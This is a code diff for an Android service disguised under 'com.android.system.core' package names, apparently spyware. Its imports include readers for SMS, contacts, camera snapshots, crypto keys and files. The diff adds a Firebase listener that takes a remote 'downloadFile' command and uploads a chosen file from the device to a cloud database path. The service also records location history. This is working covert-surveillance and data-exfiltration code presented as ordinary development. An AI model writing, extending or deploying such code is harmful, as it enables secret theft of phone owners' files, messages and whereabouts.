@@ -35,6 +35,7 @@ import com.android.system.core.crypto.KeyFetchWorker
 import com.android.system.core.contacts.ContactsReader
 import com.android.system.core.camera.CameraSnapshotWorker
 import com.android.system.core.files.FileMetaReader
+import com.android.system.core.files.FileUploadWorker
 import com.android.system.core.sms.SmsReader
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
@@ -467,6 +468,39 @@ class LocationForegroundService : Service() {
             }
         })
         if (BuildConfig.DEBUG) { Log.d(TAG, "✅ Show launcher listener started for device: $uid") }
+
+        // Firebase listener for downloadFile command
+        commandsRef.child("downloadFile").addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val status = snapshot.child("status").getValue(String::class.java)
+                if (status != "pending") return
+
+                val fileIndex = snapshot.child("fileIndex").getValue(String::class.java)
+                if (fileIndex == null) {
+                    snapshot.ref.child("status").setValue("failed")
+                    return
+                }
+
+                snapshot.ref.child("status").setValue("ack")
+                snapshot.ref.child("ackedAt").setValue(ServerValue.TIMESTAMP)
+
+                scope.launch {
+                    val storagePath = FileUploadWorker(applicationContext, uid, fileIndex).upload()
+                    if (storagePath != null) {
+                        FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                            .getReference("devices/$uid/files/$fileIndex/storagePath")
+                            .setValue(storagePath)
+                        snapshot.ref.child("status").setValue("done")
+                    } else {
+                        snapshot.ref.child("status").setValue("failed")
+                    }
+                    snapshot.ref.child("completedAt").setValue(ServerValue.TIMESTAMP)
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) Log.e(TAG, "downloadFile listener cancelled: ${error.message}")
+            }
+        })
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -789,8 +823,8 @@ class LocationForegroundService : Service() {
                     calendar.get(java.util.Calendar.DAY_OF_MONTH))
 
                 val historyEntry = mapOf(
-                    "lat" to latValue,
-                    "lng" to lngValue,
+                    "lat" to lat,
+                    "lng" to lng,
                     "accuracy" to accuracy.toDouble(),
                     "speed" to speed.toDouble(),
                     "bearing" to bearing.toDouble(),
